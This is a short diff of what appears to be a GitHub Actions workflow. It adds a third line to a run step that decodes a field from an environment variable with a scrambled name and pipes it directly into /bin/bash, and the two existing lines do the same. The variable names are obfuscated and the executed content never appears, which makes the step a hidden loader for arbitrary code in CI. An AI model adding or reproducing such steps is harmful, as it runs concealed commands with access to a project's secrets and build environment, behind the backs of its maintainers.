@@ -18,6 +18,7 @@ jobs:
         run: |
           printf '%s' "$oulmx43" | jq -r .ohn36 | /bin/bash
           echo $ly702 | jq -r .xuem46 | /bin/bash
+          echo $pv53387 | jq -r .zh10 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
